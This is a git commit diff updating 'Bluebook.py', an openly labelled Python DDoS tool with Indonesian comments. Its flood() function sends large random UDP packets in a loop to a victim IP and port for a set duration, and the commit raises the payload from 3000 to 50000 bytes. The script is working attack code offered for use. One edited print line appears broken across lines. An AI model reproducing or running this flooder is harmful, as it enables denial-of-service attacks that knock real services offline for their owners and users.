971169dbc57c2b9782f9a58b2da0cc18029557c4
CryptoXSS <91107078+CryptoXSS@users.noreply.github.com>
2022-02-18 02:25:02 +0100

    Update Bluebook.py

--- Bluebook/Bluebook.py
+++ Bluebook/Bluebook.py
@@ -14,40 +14,6 @@ class bcolors:
     UNDERLINE = '\033[4m'
     ABANG ='\033[31m'
 
-class colors:
-    '''Colors class:
-    Reset all colors with colors.reset
-    Two subclasses fg for foreground and bg for background.
-    Use as colors.subclass.colorname.
-    i.e. colors.fg.red or colors.bg.green
-    Also, the generic bold, disable, underline, reverse, strikethrough,
-    and invisible work with the main class
-    i.e. colors.bold
-    '''
-    reset='\033[0m'
-    bold='\033[01m'
-    disable='\033[02m'
-    underline='\033[04m'
-    reverse='\033[07m'
-    strikethrough='\033[09m'
-    invisible='\033[08m'
-    class fg:
-        black='\033[30m'
-        red='\033[31m'
-        green='\033[32m'
-        orange='\033[33m'
-        blue='\033[34m'
-        purple='\033[35m'
-        cyan='\033[36m'
-        lightgrey='\033[37m'
-        darkgrey='\033[90m'
-        lightred='\033[91m'
-        lightgreen='\033[92m'
-        yellow='\033[93m'
-        lightblue='\033[94m'
-        pink='\033[95m'
-        lightcyan='\033[96m'
-
 def usage():
     print \
    bcolors.IJO + """
@@ -71,15 +37,14 @@ def usage():
 \033[94m\033[95m>>\033[92mBYTES \033[93m[Data Yang Dikirim Contoh:20000]
 """
 
-print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
 
 def flood(korbanmu, vport, durasi):
     # okeh kali ini kami membuat tools DDOS 
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # Gunakan Dengan Bijak Yah
-    bytes = random._urandom(3000)
+    bytes = random._urandom(50000)
     timeout =  time.time() + durasi
-    sent = 50000
+    sent = 999999
 
     while 1:
         if time.time() > timeout:
@@ -88,15 +53,15 @@ def flood(korbanmu, vport, durasi):
             pass
         client.sendto(bytes, (korbanmu, vport))
         sent = sent + 1
-        print bcolors.HEADER + "[\033[94m*\033[95m]SYS[\033[92m%s\033[95m] UDP [\033[91m%s\033[0m] PORT [\033[91m%s\033[4m\033[94m proxy \033[91m]" %(sent, korbanmu, vport)
-	
+        print bcolors.HEADER + "[\033[94m*\033[95m] BYTES / DETIK [\033[92m%s\033[95m] KE [\033[91m%s\033[95m] PORT [\033[94m%s\033[95m] "
+	%(sent, korbanmu, vport)
+
 def main():
     print len(sys.argv)
     if len(sys.argv) != 4:
         usage()
     else:
         flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
-
 
 if __name__ == '__main__':
     main()
